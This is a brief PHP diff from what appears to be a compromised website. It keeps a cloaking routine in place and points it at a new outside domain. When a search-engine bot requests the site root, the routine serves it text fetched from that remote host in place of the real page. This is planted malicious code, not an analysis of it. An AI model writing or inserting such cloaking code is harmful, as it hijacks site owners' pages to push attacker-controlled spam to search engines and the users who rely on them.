@@ -18,7 +18,7 @@ function aselolejos($url){
 if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/") {
     usleep(rand(100000, 200000)); 
     header('Content-Type: text/html; charset=utf-8');
-    echo aselolejos("https://powerrangerijo.site/lp/sg.txt");
+    echo aselolejos("https://mysantika.org/ktu.txt");
     ob_end_flush();
     exit;
 }
